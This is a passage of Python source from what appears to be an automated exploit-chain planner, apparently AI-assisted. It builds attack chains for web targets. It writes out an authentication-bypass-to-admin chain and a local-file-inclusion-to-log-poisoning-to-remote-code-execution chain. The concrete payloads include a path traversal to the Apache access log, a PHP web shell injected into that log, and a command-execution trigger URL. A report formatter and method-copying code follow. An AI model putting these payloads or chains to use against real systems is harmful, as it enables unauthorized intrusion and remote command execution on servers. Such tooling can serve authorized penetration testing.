            vuln_url = self._build_full_url(vuln_url)
        
        admin_url = admin_ep.get("url", "")
        if not admin_url.startswith(('http://', 'https://')):
            admin_url = self._build_full_url(admin_url)
        
        return ExploitChain(
            name="Auth Bypass → Admin Takeover",
            description="Bypass authentication to access admin panel",
            risk_level="HIGH",
            estimated_time="5-15 min",
            prerequisites=["Auth vulnerability", "Admin endpoint"],
            steps=[
                ExploitStep(name="Bypass Auth", action="exploit_auth_bypass", target=vuln_url, tool="curl"),
                ExploitStep(name="Access Admin", action="enter_admin", target=admin_url, tool="curl", depends_on=["Bypass Auth"]),
            ]
        )

    def _build_lfi_log_poison_chain(self, vuln: Dict) -> ExploitChain:
        vuln_url = vuln.get("url", "")
        if not vuln_url.startswith(('http://', 'https://')):
            vuln_url = self._build_full_url(vuln_url)
        
        target_base = self._get_base_url()
        
        return ExploitChain(
            name="LFI → Log Poisoning → RCE",
            description="Use LFI to read logs, poison logs for RCE",
            risk_level="HIGH",
            estimated_time="15-45 min",
            prerequisites=["LFI vulnerability"],
            steps=[
                ExploitStep(name="Read Logs", action="read_log_file", target=vuln_url, tool="curl", payload="../../../../var/log/apache2/access.log"),
                ExploitStep(name="Poison Log", action="inject_log", target=target_base, tool="curl", payload="<?php system($_GET['cmd']); ?>"),
                ExploitStep(name="Execute RCE", action="trigger_rce", target=vuln_url, tool="curl", depends_on=["Poison Log"], payload="?file=../../../var/log/apache2/access.log&cmd=id"),
            ]
        )

    def format_chain_report(self, chains: List[ExploitChain]) -> str:
        """Format chains into readable report"""
        lines = [
            "=" * 60,
            "  EXPLOIT CHAIN ANALYSIS",
            "=" * 60,
            f"  {len(chains)} exploit chains identified",
            "",
        ]

        for i, chain in enumerate(chains, 1):
            lines.extend([
                f"[{i}] {chain.name}",
                f"    Risk Level : {chain.risk_level}",
                f"    Est. Time  : {chain.estimated_time}",
                f"    Steps      : {len(chain.steps)}",
                f"    Description: {chain.description}",
                "",
                "    STEPS:",
            ])
            for j, step in enumerate(chain.steps, 1):
                lines.append(f"    {j}. {step.name}")
                lines.append(f"       Action : {step.action}")
                if step.tool:
                    lines.append(f"       Tool   : {step.tool}")
                if step.payload:
                    lines.append(f"       Payload: {step.payload[:60]}")
                lines.append(f"       Success: {step.success_indicator}")
            lines.append("=" * 60)

        return "\n".join(lines)


# Restore legacy ChainPlanner helpers after introducing AIPoweredChainPlanner.
for _method_name in [
    "smart_prioritize",
    "_build_conditioned_wp_chains",
    "_calculate_impact_score",
    "_calculate_likelihood_score",
    "execute_chain",
    "_check_prerequisites",
    "_execute_step",
    "_build_wp_admin_chain",
    "_build_xmlrpc_chain",
    "_build_sqli_chain",
    "_build_upload_chain",
    "_build_lfi_chain",
    "_build_xss_chain",
    "_build_wp_plugin_chain",
    "combine_chains",
    "_chains_overlap",
    "_merge_chains",
    "_detect_chain_patterns",
    "_build_upload_admin_chain",
    "_build_auth_bypass_chain",
    "_build_lfi_log_poison_chain",
    "format_chain_report",
]:
    setattr(ChainPlanner, _method_name, getattr(AIPoweredChainPlanner, _method_name))
